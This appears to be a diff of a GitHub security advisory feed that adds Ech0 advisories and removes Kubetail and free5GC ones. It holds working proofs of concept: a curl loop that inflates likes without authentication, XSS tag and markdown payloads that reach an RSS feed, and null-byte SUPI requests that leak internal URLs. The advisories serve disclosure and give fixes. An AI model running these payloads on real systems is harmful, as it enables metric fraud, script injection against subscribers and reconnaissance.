+<p><strong>No authentication</strong> is required to invoke <strong><code>PUT /api/echo/like/:id</code></strong>. The handler is registered on the <strong>public</strong> router group. The service increments <strong><code>fav_count</code></strong> for the given echo <strong>without</strong> checking identity, <strong>without</strong> a per-user limit, and <strong>without</strong> CSRF tokens. A remote client can <strong>arbitrarily inflate</strong> like metrics with repeated requests.</p>
+<h3 id="description">Description</h3>
+<p><strong>Root cause:</strong> The like endpoint is explicitly public (<code>PublicRouterGroup</code>). <code>LikeEcho</code> in the service layer only runs a repository increment inside a transaction—no viewer/user binding.</p>
+<p><strong>Security boundary that fails:</strong> <strong>Integrity</strong> of engagement metrics (likes) and any trust that “likes” represent distinct or authenticated users.</p>
+<p><strong>Exploitation:</strong> Discover or guess a public echo UUID (timeline, API, share link) → send <strong>unauthenticated</strong> <code>PUT</code> repeatedly → <strong><code>fav_count</code></strong> increases linearly.</p>
+<h3 id="affected-files">Affected files</h3>
+<p>| Public route registration | <code>internal/router/echo.go</code> |
+| Like mutation (no auth check) | <code>internal/service/echo/echo.go</code> |
+| Handler | <code>internal/handler/echo/echo.go</code> |</p>
+<h3 id="vulnerable--relevant-code">Vulnerable / relevant code</h3>
+<p><strong>Public PUT route:</strong></p>
+<pre><code class="language-11:13:Ech0/internal/router/echo.go">    // Public
+    appRouterGroup.PublicRouterGroup.PUT("/echo/like/:id", h.EchoHandler.LikeEcho())
+    appRouterGroup.PublicRouterGroup.GET("/tags", h.EchoHandler.GetAllTags())
+</code></pre>
+<p><strong>Service does not use viewer / rate limit:</strong></p>
+<pre><code class="language-244:248:Ech0/internal/service/echo/echo.go">func (echoService *EchoService) LikeEcho(ctx context.Context, id string) error {
+    return echoService.transactor.Run(ctx, func(txCtx context.Context) error {
+        return echoService.echoRepository.LikeEcho(txCtx, id)
+    })
+}
+</code></pre>
+<h3 id="execution-flow">Execution flow</h3>
+<ol>
+<li>Client resolves <code>ECHO_ID</code> (e.g. <code>GET /api/echo/page</code> with any valid token, or from UI).</li>
+<li>Client sends <strong><code>PUT /api/echo/like/{ECHO_ID}</code></strong> with <strong>no</strong> <code>Authorization</code> header.</li>
+<li>Gin matches <strong>public</strong> route → handler → <code>EchoService.LikeEcho</code> → DB increments <strong><code>fav_count</code></strong>.</li>
+<li>Repeat N times → count increases by N.</li>
+</ol>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<pre><code class="language-bash">BASE="http://127.0.0.1:6277"
+
+OWNER_TOKEN=$(curl -sS -X POST "$BASE/api/login" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"owner","password":"OwnerPass123"}' | jq -r '.data')
+
+ECHO_ID=$(curl -sS "$BASE/api/echo/page?page=1&amp;page_size=1" \
+  -H "Authorization: Bearer $OWNER_TOKEN" | jq -r '.data.items[0].id')
+
+# Single unauthenticated like
+curl -sS -w "\nHTTP:%{http_code}\n" -X PUT "$BASE/api/echo/like/$ECHO_ID"
+
+# Inflate (e.g. 55 times); expect HTTP 200 each time
+for i in $(seq 1 55); do
+  curl -sS -o /dev/null -w "%{http_code}\n" -X PUT "$BASE/api/echo/like/$ECHO_ID"
+done
+
+# Observe fav_count
+curl -sS "$BASE/api/echo/$ECHO_ID" | jq '.data | {id, fav_count}'
+</code></pre>
+<p><strong>Observed proof (manual test):</strong></p>
+<ul>
+<li>Each unauthenticated <code>PUT</code> returned <strong>HTTP <code>200</code></strong> with success JSON (e.g. <code>点赞Echo成功</code>, <code>code:1</code>).</li>
+<li><strong><code>fav_count</code></strong> increased to <strong>113</strong> , demonstrating <strong>linear inflation from one client</strong> with <strong>no authentication</strong>.<img width="1109" height="188" alt="Screenshot 2026-04-01 105522" src="https://github.com/user-attachments/assets/a725cf10-d20b-45a1-95bb-2e8ea396c08c"></li>
+</ul>
+<h3 id="impact">Impact</h3>
+<p><strong>Like counts and ranking/social proof</strong> can be falsified; feeds or “popular” logic tied to <code>fav_count</code> are untrustworthy. 
+high-volume loops add DB write load; possible abuse against availability at scale. </p>
+<p><strong>Attacker capability:</strong> Anyone on the network can manipulate <strong>public</strong> engagement metrics for any known echo id. Combined with permissive <strong>CORS</strong> browsers could automate cross-origin requests.</p>
+<h2 id="remediation">Remediation</h2>
+<p> Require authentication for likes and enforce <strong>one like per principal</strong>, <strong>or</strong> keep anonymous likes but add <strong>rate limiting</strong>, <strong>proof-of-work / captcha</strong>, or <strong>signed tokens</strong> tied to anon sessions; document that counts are <strong>not</strong> auditor-grade metrics.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lin-snow/Ech0/security/advisories/GHSA-rgj7-vg8v-j4wr">https://github.com/lin-snow/Ech0/security/advisories/GHSA-rgj7-vg8v-j4wr</a></li>
+<li><a href="https://github.com/lin-snow/Ech0/commit/a7e8b8e84bd1e3db090dfb720f2c6c433356b442">https://github.com/lin-snow/Ech0/commit/a7e8b8e84bd1e3db090dfb720f2c6c433356b442</a></li>
+<li><a href="https://github.com/advisories/GHSA-rgj7-vg8v-j4wr">https://github.com/advisories/GHSA-rgj7-vg8v-j4wr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rgj7-vg8v-j4wr</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-07T21:21:21.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/lin-snow/Ech0] Ech0's RSS feed renders unescaped tag names and raw-HTML markdown, stored XSS against subscribers]]></title>
+        <id>https://github.com/advisories/GHSA-3v85-fqvh-7rxf</id>
+        <link href="https://github.com/advisories/GHSA-3v85-fqvh-7rxf"/>
+        <updated>2026-05-07T21:18:28.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The public RSS/Atom feed at <code>/rss</code> renders two attacker-controlled surfaces without HTML escaping. Tag names flow through <code>fmt.Appendf(renderedContent, "&lt;br /&gt;&lt;span class=\"tag\"&gt;#%s&lt;/span&gt;", tag.Name)</code> at <code>internal/service/common/common.go:120</code>, and the Markdown renderer at <code>internal/util/md/md.go</code> does not set the <code>html.SkipHTML</code> flag, so raw HTML blocks in echo content pass through unmodified. The resulting Atom <code>&lt;summary type="html"&gt;</code> is valid XML but contains executable <code>&lt;script&gt;</code> tags after the RSS reader decodes it. RSS subscribers whose readers render HTML (including many self-hosted and desktop clients) execute attacker JavaScript in the reader's origin.</p>
+<h2 id="details">Details</h2>
+<p>Tag sink at <code>internal/service/common/common.go:120</code>:</p>
+<pre><code class="language-go">if len(msg.Tags) &gt; 0 {
+    for _, tag := range msg.Tags {
+        renderedContent = fmt.Appendf(renderedContent,
+            "&lt;br /&gt;&lt;span class=\"tag\"&gt;#%s&lt;/span&gt;", tag.Name)
+    }
+}
+</code></pre>
+<p><code>fmt.Appendf</code> with <code>%s</code> does not HTML-escape. Tag names come from user-supplied <code>EchoUpsertDto.Tags</code> and are persisted after <code>strings.TrimSpace(strings.TrimPrefix(tag.Name, "#"))</code> at <code>internal/service/echo/echo.go:326</code>, which strips a leading <code>#</code> and trims whitespace but does nothing about HTML metacharacters. A tag name of <code>&lt;/span&gt;&lt;script&gt;document.title='RSS-XSS-HIT'&lt;/script&gt;&lt;span&gt;x</code> breaks out of the surrounding <code>&lt;span&gt;</code> element and injects executable JavaScript into the RSS <code>summary</code> field.</p>
+<p>Markdown sink at <code>internal/util/md/md.go</code>:</p>
+<pre><code class="language-go">htmlFlags := html.CommonFlags | html.Safelink | html.HrefTargetBlank |
+             html.NoopenerLinks | html.NoreferrerLinks
+// html.SkipHTML is NOT set
+</code></pre>
+<p>The <code>gomarkdown</code> library passes raw HTML through when <code>SkipHTML</code> is not set. <code>MdToHTML([]byte(msg.Content))</code> at <code>internal/service/common/common.go:102</code> produces the rendered HTML for the echo body; tag markup is appended to that output at line 120 and the combined byte slice becomes the RSS <code>summary</code> field.</p>
+<p>The RSS feed declares <code>&lt;summary type="html"&gt;</code>, which per Atom RFC 4287 §3.1.1.3 means the content is HTML encoded as XML. RSS readers that render HTML decode the XML entities and pass the decoded string to an HTML renderer. Any script tag survives this round-trip.</p>
+<p>Echo creation requires admin role (<code>internal/service/echo/echo.go:54-56</code> checks <code>user.IsAdmin</code>). In a single-admin Ech0 instance this is self-attack. In a multi-admin deployment (non-owner admins promoted by the owner), one admin injects XSS into the shared RSS feed consumed by other admins, registered users, and anonymous subscribers.</p>
+<p>Prior precedent: GHSA-69hx-63pv-f8f4 (2026-04-09) accepted stored XSS via SVG file upload, with the same "admin creates content" precondition. Cross-subscriber RSS XSS from one admin belongs to the same class.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Default install, admin account seeds malicious tag + markdown content, anonymous subscriber fetches <code>/rss</code> and the decoded summary contains executable <code>&lt;script&gt;</code>:</p>
+<pre><code class="language-python">import requests, xml.etree.ElementTree as ET, html
+TARGET = "http://localhost:8300"
+
+# Admin creates two echoes: one with a hostile tag name, one with raw-HTML markdown.
+owner = requests.post(f"{TARGET}/api/login",
+                      json={"username": "owner", "password": "owner-pw"}
+                     ).json()["data"]["access_token"]
+
+tag_payload = "&lt;/span&gt;&lt;script&gt;document.title='RSS-XSS-HIT'&lt;/script&gt;&lt;span&gt;x"
+md_payload = "&lt;script&gt;document.title='MD-XSS-HIT'&lt;/script&gt;normal text"
+
+requests.post(f"{TARGET}/api/echos",
+              headers={"Authorization": f"Bearer {owner}",
+                       "content-type": "application/json"},
+              json={"content": "echo with malicious tag",
+                    "tags": [tag_payload]})
+
+requests.post(f"{TARGET}/api/echos",
+              headers={"Authorization": f"Bearer {owner}",
+                       "content-type": "application/json"},
+              json={"content": md_payload})
+
+# Anyone fetches /rss anonymously.
+feed = requests.get(f"{TARGET}/rss").text
+root = ET.fromstring(feed)
+ns = {"atom": "http://www.w3.org/2005/Atom"}
+for entry in root.findall("atom:entry", ns):
+    summary = entry.find("atom:summary", ns)
+    decoded = html.unescape(summary.text or "")
+    if "&lt;script&gt;" in decoded.lower():
+        print(f"  *** EXECUTABLE &lt;script&gt; in decoded summary ***")
+        print(f"    raw:     {(summary.text or '')[:200]!r}")
+        print(f"    decoded: {decoded[:200]!r}")
+</code></pre>
+<p>Observed on v4.5.6:</p>
+<pre><code>*** EXECUTABLE &lt;script&gt; in decoded summary ***
+  raw:     "&lt;p&gt;&lt;script&gt;document.title=&amp;lsquo;MD-XSS-HIT&amp;rsquo;&lt;/script&gt;normal text&lt;/p&gt;\n"
+  decoded: "&lt;p&gt;&lt;script&gt;document.title='MD-XSS-HIT'&lt;/script&gt;normal text&lt;/p&gt;\n"
+*** EXECUTABLE &lt;script&gt; in decoded summary ***
+  raw:     '&lt;p&gt;echo with malicious tag&lt;/p&gt;\n&lt;br /&gt;&lt;span class="tag"&gt;#&lt;/span&gt;&lt;script&gt;document.title=\'RSS-XSS-HIT\'&lt;/script&gt;&lt;span&gt;x&lt;/span&gt;'
+  decoded: '&lt;p&gt;echo with malicious tag&lt;/p&gt;\n&lt;br /&gt;&lt;span class="tag"&gt;#&lt;/span&gt;&lt;script&gt;document.title=\'RSS-XSS-HIT\'&lt;/script&gt;&lt;span&gt;x&lt;/span&gt;'
+</code></pre>
+<p>Two separate <code>&lt;script&gt;</code> tags land in the public RSS feed: one via the tag-name sink, one via the markdown raw-HTML sink. Any RSS reader that decodes <code>type="html"</code> content and renders the HTML (common in self-hosted readers like Tiny Tiny RSS and FreshRSS's default settings, and in several desktop readers) executes the script.</p>
+<h2 id="impact">Impact</h2>
+<p>A non-owner admin with echo-creation rights (or the owner themselves if RSS pushes to subscribers the owner did not hand-pick) injects persistent JavaScript into the public RSS feed. The RSS feed reaches:</p>
+<ul>
+<li><strong>Anonymous subscribers</strong> who follow the blog's RSS URL in their reader.</li>
+<li><strong>Registered non-admin users</strong> who may subscribe to the feed.</li>
+<li><strong>Other admins</strong> on the same instance.</li>
+</ul>
+<p>Each subscriber whose reader renders <code>type="html"</code> content runs the attacker's script in the reader's origin. Depending on the reader, the payload:</p>
+<ul>
+<li>Reads the reader's own UI tokens and exfiltrates them.</li>
+<li>Makes authenticated requests to other feeds the reader polls (cross-feed data theft).</li>
+<li>Plants phishing content that looks like a legitimate feed entry.</li>
+</ul>
+<p>The class is stored XSS with cross-user reach. Severity compared to GHSA-69hx-63pv-f8f4 (SVG-upload stored XSS, accepted as Medium): reach is similar (anonymous subscribers via a published feed URL), and the admin precondition matches.</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Two independent fixes, both needed.</p>
+<p>Tag names: HTML-escape before interpolation.</p>
+<pre><code class="language-go">for _, tag := range msg.Tags {
+    renderedContent = fmt.Appendf(renderedContent,
+        "&lt;br /&gt;&lt;span class=\"tag\"&gt;#%s&lt;/span&gt;", html.EscapeString(tag.Name))
+}
+</code></pre>
+<p>Markdown: add <code>html.SkipHTML</code> to the renderer flags so raw HTML in echo markdown is stripped.</p>
+<pre><code class="language-go">htmlFlags := html.CommonFlags |
+             html.Safelink |
+             html.HrefTargetBlank |
+             html.NoopenerLinks |
+             html.NoreferrerLinks |
+             html.SkipHTML
+</code></pre>
+<p>Validate tag names at creation time too. A central validator in <code>EchoService.Create</code> that rejects tags containing <code>&lt;</code>, <code>&gt;</code>, or <code>"</code> removes the attacker payload before it reaches the DB:</p>
+<pre><code class="language-go">for _, name := range newEcho.Tags {
+    if strings.ContainsAny(name, "&lt;&gt;\"'&amp;") {
+        return errors.New(commonModel.INVALID_TAG_NAME)
+    }
+}
+</code></pre>
+<hr>
+<p><em>Found by <a href="https://aisafe.io">aisafe.io</a></em></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lin-snow/Ech0/security/advisories/GHSA-3v85-fqvh-7rxf">https://github.com/lin-snow/Ech0/security/advisories/GHSA-3v85-fqvh-7rxf</a></li>
+<li><a href="https://github.com/lin-snow/Ech0/commit/fd320fe3e9021c8d8d284fb274775c018690520e">https://github.com/lin-snow/Ech0/commit/fd320fe3e9021c8d8d284fb274775c018690520e</a></li>
+<li><a href="https://github.com/advisories/GHSA-3v85-fqvh-7rxf">https://github.com/advisories/GHSA-3v85-fqvh-7rxf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3v85-fqvh-7rxf</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-07T21:18:27.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/lin-snow/Ech0] Ech0 comment model's Email field returned on public /api/comments endpoints]]></title>
         <id>https://github.com/advisories/GHSA-rj4g-rqgh-rx9h</id>
@@ -1000,644 +1677,5 @@ spec:
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-05-07T02:38:02.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/kubetail-org/kubetail/modules/cli] Kubetail has a Cross-Site WebSocket Hijacking issue that allows attacker to read Kubernetes logs from authenticated users]]></title>
-        <id>https://github.com/advisories/GHSA-v8j7-hp7c-738f</id>
-        <link href="https://github.com/advisories/GHSA-v8j7-hp7c-738f"/>
-        <updated>2026-05-07T02:34:33.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Kubetail's dashboard exposes WebSocket endpoints that did not adequately validate the Origin header on connection upgrade. A malicious web page visited by a user with an active Kubetail session could open a WebSocket to the user's dashboard and read their Kubernetes logs in real time. This is a Cross-Site WebSocket Hijacking (CSWSH) vulnerability and affects both the desktop deployment (default <a href="http://localhost:7500">http://localhost:7500</a>) and cluster deployments (typically behind an Ingress with HTTP basic auth).</p>
-<h3 id="impact">Impact</h3>
-<p>An attacker who can convince an authenticated Kubetail user to visit a page they control can:</p>
-<ul>
-<li>Establish a WebSocket connection to the victim's dashboard from the attacker's origin</li>
-<li>Stream container logs the victim has access to via the Kubernetes API</li>
-<li>Exfiltrate the contents to an attacker-controlled server</li>
-</ul>
-<p>The attacker gains <strong>read-only</strong> access to logs — no write or destructive operations are exposed. However, container logs frequently contain credentials accidentally written by application code, bearer tokens, internal hostnames, customer PII, and other secrets, so the practical impact of read access can be significant.</p>
-<p>The desktop deployment is particularly exposed because the dashboard is reachable at a predictable localhost URL, requires no network reachability from the attacker, and the browser will attach ambient credentials to the WebSocket handshake.
-For cluster deployments fronted by HTTP basic auth, the browser's automatic re-sending of basic-auth credentials on the WebSocket upgrade request enables the same attack against the configured dashboard origin.</p>
-<h3 id="affected-versions">Affected versions</h3>
-<table>
-<thead>
-<tr>
-<th>Component</th>
-<th>Name</th>
-<th>Affected</th>
-<th>Patched</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Kubetail Dashboard docker image</td>
-<td><code>kubetail-dashboard</code></td>
-<td>&lt; 0.14.0</td>
-<td>&gt;= 0.14.0</td>
-</tr>
-<tr>
-<td>Kubetail Helm Chart</td>
-<td><code>kubetail/kubetail</code></td>
-<td>&lt; 0.23.0</td>
-<td>&gt;= 0.23.0</td>
-</tr>
-<tr>
-<td>Kubetail CLI</td>
-<td><code>kubetail</code></td>
-<td>&lt; 0.16.0</td>
-<td>&gt;= 0.16.0</td>
-</tr>
-</tbody></table>
-<p>Confirmed in Google Chrome. Microsoft Edge is presumed affected as it shares Chromium's WebSocket implementation, but was not directly tested.</p>
-<p><strong>Preconditions for exploitation</strong></p>
-<ol>
-<li>The victim has an active authenticated Kubetail session (desktop dashboard running, or browser holding valid credentials for a cluster deployment).</li>
-<li>The victim visits a web page controlled by the attacker in the same browser.</li>
-<li>The attacker knows or can guess the dashboard URL (trivial for desktop; cluster deployments require knowing the Ingress hostname).</li>
-</ol>
-<h3 id="patches">Patches</h3>
-<p>Upgrade to:</p>
-<ul>
-<li>Kubetail Dashboard 0.14.0 or later</li>
-<li>Kubetail Helm Chart 0.23.0 or later</li>
-<li>Kubetail CLI 0.16.0 or later</li>
-</ul>
-<h3 id="workarounds">Workarounds</h3>
-<p>If users cannot upgrade immediately:</p>
-<ul>
-<li><strong>Desktop:</strong> Stop the dashboard (kubetail CLI process) when not actively in use. Avoid visiting untrusted sites in the same browser profile while the dashboard is running.</li>
-<li><strong>Cluster:</strong> Restrict Ingress access to a VPN, bastion, or office network. Add a stronger outer authentication layer (e.g. OAuth proxy) in front of basic auth. Consider browser profile isolation for cluster admins.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/kubetail-org/kubetail/security/advisories/GHSA-v8j7-hp7c-738f">https://github.com/kubetail-org/kubetail/security/advisories/GHSA-v8j7-hp7c-738f</a></li>
-<li><a href="https://github.com/advisories/GHSA-v8j7-hp7c-738f">https://github.com/advisories/GHSA-v8j7-hp7c-738f</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-v8j7-hp7c-738f</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-07T02:34:32.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/kubetail-org/kubetail/modules/dashboard] Kubetail has a Cross-Site WebSocket Hijacking issue that allows attacker to read Kubernetes logs from authenticated users]]></title>
-        <id>https://github.com/advisories/GHSA-v8j7-hp7c-738f</id>
-        <link href="https://github.com/advisories/GHSA-v8j7-hp7c-738f"/>
-        <updated>2026-05-07T02:34:33.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Kubetail's dashboard exposes WebSocket endpoints that did not adequately validate the Origin header on connection upgrade. A malicious web page visited by a user with an active Kubetail session could open a WebSocket to the user's dashboard and read their Kubernetes logs in real time. This is a Cross-Site WebSocket Hijacking (CSWSH) vulnerability and affects both the desktop deployment (default <a href="http://localhost:7500">http://localhost:7500</a>) and cluster deployments (typically behind an Ingress with HTTP basic auth).</p>
-<h3 id="impact">Impact</h3>
-<p>An attacker who can convince an authenticated Kubetail user to visit a page they control can:</p>
-<ul>
-<li>Establish a WebSocket connection to the victim's dashboard from the attacker's origin</li>
-<li>Stream container logs the victim has access to via the Kubernetes API</li>
-<li>Exfiltrate the contents to an attacker-controlled server</li>
-</ul>
-<p>The attacker gains <strong>read-only</strong> access to logs — no write or destructive operations are exposed. However, container logs frequently contain credentials accidentally written by application code, bearer tokens, internal hostnames, customer PII, and other secrets, so the practical impact of read access can be significant.</p>
-<p>The desktop deployment is particularly exposed because the dashboard is reachable at a predictable localhost URL, requires no network reachability from the attacker, and the browser will attach ambient credentials to the WebSocket handshake.
-For cluster deployments fronted by HTTP basic auth, the browser's automatic re-sending of basic-auth credentials on the WebSocket upgrade request enables the same attack against the configured dashboard origin.</p>
-<h3 id="affected-versions">Affected versions</h3>
-<table>
-<thead>
-<tr>
-<th>Component</th>
-<th>Name</th>
-<th>Affected</th>
-<th>Patched</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Kubetail Dashboard docker image</td>
-<td><code>kubetail-dashboard</code></td>
-<td>&lt; 0.14.0</td>
-<td>&gt;= 0.14.0</td>
-</tr>
-<tr>
-<td>Kubetail Helm Chart</td>
-<td><code>kubetail/kubetail</code></td>
-<td>&lt; 0.23.0</td>
-<td>&gt;= 0.23.0</td>
-</tr>
-<tr>
-<td>Kubetail CLI</td>
-<td><code>kubetail</code></td>
-<td>&lt; 0.16.0</td>
-<td>&gt;= 0.16.0</td>
-</tr>
-</tbody></table>
-<p>Confirmed in Google Chrome. Microsoft Edge is presumed affected as it shares Chromium's WebSocket implementation, but was not directly tested.</p>
-<p><strong>Preconditions for exploitation</strong></p>
-<ol>
-<li>The victim has an active authenticated Kubetail session (desktop dashboard running, or browser holding valid credentials for a cluster deployment).</li>
-<li>The victim visits a web page controlled by the attacker in the same browser.</li>
-<li>The attacker knows or can guess the dashboard URL (trivial for desktop; cluster deployments require knowing the Ingress hostname).</li>
-</ol>
-<h3 id="patches">Patches</h3>
-<p>Upgrade to:</p>
-<ul>
-<li>Kubetail Dashboard 0.14.0 or later</li>
-<li>Kubetail Helm Chart 0.23.0 or later</li>
-<li>Kubetail CLI 0.16.0 or later</li>
-</ul>
-<h3 id="workarounds">Workarounds</h3>
-<p>If users cannot upgrade immediately:</p>
-<ul>
-<li><strong>Desktop:</strong> Stop the dashboard (kubetail CLI process) when not actively in use. Avoid visiting untrusted sites in the same browser profile while the dashboard is running.</li>
-<li><strong>Cluster:</strong> Restrict Ingress access to a VPN, bastion, or office network. Add a stronger outer authentication layer (e.g. OAuth proxy) in front of basic auth. Consider browser profile isolation for cluster admins.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/kubetail-org/kubetail/security/advisories/GHSA-v8j7-hp7c-738f">https://github.com/kubetail-org/kubetail/security/advisories/GHSA-v8j7-hp7c-738f</a></li>
-<li><a href="https://github.com/advisories/GHSA-v8j7-hp7c-738f">https://github.com/advisories/GHSA-v8j7-hp7c-738f</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-v8j7-hp7c-738f</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-07T02:34:32.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/free5gc/udm] Free5GC UDM has Improper Input Validation and Generation of Error Messages Containing Sensitive Information]]></title>
-        <id>https://github.com/advisories/GHSA-585v-hcgf-jhfr</id>
-        <link href="https://github.com/advisories/GHSA-585v-hcgf-jhfr"/>
-        <updated>2026-05-07T02:10:00.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The free5GC UDM component fails to validate the <code>supi</code> path parameter in six GET handlers of the <code>nudm-sdm</code> (Subscriber Data Management) service. An unauthenticated attacker can inject control characters into the SUPI parameter, causing UDM to forward a malformed request to UDR and return a <code>500 Internal Server Error</code> response that exposes internal infrastructure details.</p>
-<h2 id="affected-package">Affected Package</h2>
-<ul>
-<li><strong>Ecosystem</strong>: Go</li>
-<li><strong>Package</strong>: <code>github.com/free5gc/udm</code></li>
-<li><strong>Affected versions</strong>: <code>&lt;= v1.4.2</code></li>
-<li><strong>Patched versions</strong>: none yet</li>
-</ul>
-<h2 id="details">Details</h2>
-<p>The following handlers in <code>internal/sbi/api_subscriberdatamanagement.go</code> do not call <code>validator.IsValidSupi()</code> before passing the <code>supi</code> parameter to the processor:</p>
-<ul>
-<li><code>HandleGetSmfSelectData</code> — <code>GET /:supi/smf-select-data</code></li>
-<li><code>HandleGetSupi</code> — <code>GET /:supi</code></li>
-<li><code>HandleGetTraceData</code> — <code>GET /:supi/trace-data</code></li>
-<li><code>HandleGetUeContextInSmfData</code> — <code>GET /:supi/ue-context-in-smf-data</code></li>
-<li><code>HandleGetNssai</code> — <code>GET /:supi/nssai</code></li>
-<li><code>HandleGetSmData</code> — <code>GET /:supi/sm-data</code></li>
-</ul>
-<p>By contrast, <code>HandleGetAmData</code> in the same file correctly validates the <code>supi</code> parameter:</p>
-<pre><code class="language-go">// HandleGetAmData — correctly validates (not vulnerable)
-supi := c.Params.ByName("supi")
-if !validator.IsValidSupi(supi) {
-    c.JSON(http.StatusBadRequest, problemDetail)
-    return
-}
-
-// HandleGetSmfSelectData — missing validation (vulnerable)
-supi := c.Params.ByName("supi")
-// ← no validator.IsValidSupi(supi) call
-s.Processor().GetSmfSelectDataProcedure(c, supi, plmnID, supportedFeatures)
-</code></pre>
-<p>The malformed <code>supi</code> is passed to the processor which constructs a URL to forward the request to UDR. Go's <code>net/url</code> parser rejects the URL containing control characters and returns an error. UDM catches this error and responds with a <code>500 SYSTEM_FAILURE</code> that includes the full internal UDR URL in the <code>detail</code> field.</p>
-<p><strong>This is a missed fix of CVE-2026-27642</strong>, which applied the same <code>validator.IsValidSupi()</code> check only to <code>internal/sbi/api_ueauthentication.go</code> (<code>HandleConfirmAuth</code> and <code>HandleGenerateAuthData</code>), leaving the SDM service handlers unpatched.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<pre><code class="language-bash"># Vulnerable — returns 500 with internal UDR URL exposed
-curl "http://&lt;UDM_HOST&gt;/nudm-sdm/v2/imsi-22277%00INJECTED/smf-select-data"
-curl "http://&lt;UDM_HOST&gt;/nudm-sdm/v2/imsi-22277%00INJECTED/nssai"
-curl "http://&lt;UDM_HOST&gt;/nudm-sdm/v2/imsi-22277%00INJECTED/trace-data"
-curl "http://&lt;UDM_HOST&gt;/nudm-sdm/v2/imsi-22277%00INJECTED/sm-data"
-
-# Expected (vulnerable) response:
-# HTTP 500
-# {
-#   "title": "System failure",
-#   "status": 500,
-#   "detail": "parse \"http://udr.internal:80/nudr-dr/v2/subscription-data/imsi-22277\x00INJECTED//provisioned-data/smf-selection-subscription-data\": net/url: invalid control character in URL",
-#   "cause": "SYSTEM_FAILURE"
-# }
-
-# Protected endpoint (for comparison) — returns 400
-curl "http://&lt;UDM_HOST&gt;/nudm-sdm/v2/imsi-22277%00INJECTED/am-data"
-# HTTP 400
-# {"title":"Malformed request syntax","status":400,"detail":"Supi is invalid","cause":"MANDATORY_IE_INCORRECT"}
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>An unauthenticated remote attacker can send a crafted GET request to any of the six affected endpoints to obtain:</p>
-<ol>
-<li>Internal UDR hostname and port</li>
-<li>Full internal API path structure (<code>/nudr-dr/v2/subscription-data/...</code>)</li>
-<li>UDR API version</li>
-<li>Internal service naming convention</li>
-</ol>
-<p>This information can be used to facilitate further attacks against the UDR or other internal 5G core components.</p>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<p>Add <code>validator.IsValidSupi()</code> to all six affected handlers, following the pattern already used in <code>HandleGetAmData</code>:</p>
-<pre><code class="language-go">supi := c.Params.ByName("supi")
-if !validator.IsValidSupi(supi) {
-    problemDetail := models.ProblemDetails{
-        Title:  "Malformed request syntax",
-        Status: http.StatusBadRequest,
-        Detail: "Supi is invalid",
-        Cause:  "MANDATORY_IE_INCORRECT",
-    }
-    c.Set(sbi.IN_PB_DETAILS_CTX_STR, http.StatusText(int(problemDetail.Status)))
-    c.JSON(int(problemDetail.Status), problemDetail)
-    return
-}
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/free5gc/free5gc/security/advisories/GHSA-585v-hcgf-jhfr">https://github.com/free5gc/free5gc/security/advisories/GHSA-585v-hcgf-jhfr</a></li>
-<li><a href="https://github.com/free5gc/free5gc/security/advisories/GHSA-h4wg-rp7m-8xx4">https://github.com/free5gc/free5gc/security/advisories/GHSA-h4wg-rp7m-8xx4</a></li>
-<li><a href="https://github.com/free5gc/udm/blob/v1.4.3/internal/sbi/api_subscriberdatamanagement.go">https://github.com/free5gc/udm/blob/v1.4.3/internal/sbi/api_subscriberdatamanagement.go</a></li>
-<li><a href="https://github.com/advisories/GHSA-585v-hcgf-jhfr">https://github.com/advisories/GHSA-585v-hcgf-jhfr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-585v-hcgf-jhfr</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-07T02:09:58.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/ipld/go-ipld-prime] go-ipld-prime's DAG-CBOR and DAG-JSON decoders have unbounded recursion depth]]></title>
-        <id>https://github.com/advisories/GHSA-w239-58x2-q8p5</id>
-        <link href="https://github.com/advisories/GHSA-w239-58x2-q8p5"/>
-        <updated>2026-05-07T02:39:57.000Z</updated>
